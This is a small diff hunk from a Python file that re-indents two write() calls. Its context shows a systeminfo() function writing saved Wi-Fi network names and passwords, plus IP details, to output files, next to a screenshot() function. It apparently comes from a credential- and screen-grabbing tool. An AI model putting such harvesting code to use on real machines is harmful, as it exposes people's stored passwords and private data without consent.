@@ -347,8 +347,8 @@ def systeminfo():
         sys_lines.append('\nWIFI:')
         for network, password in wifilist:
             sys_lines.append(f'{network}: {password}')
-        write(sysinfooutput, '\n'.join(sys_lines))
-        write(ipoutput, '\n'.join(ip_lines))
+    write(sysinfooutput, '\n'.join(sys_lines))
+    write(ipoutput, '\n'.join(ip_lines))
 
 def screenshot():
     global ss_success
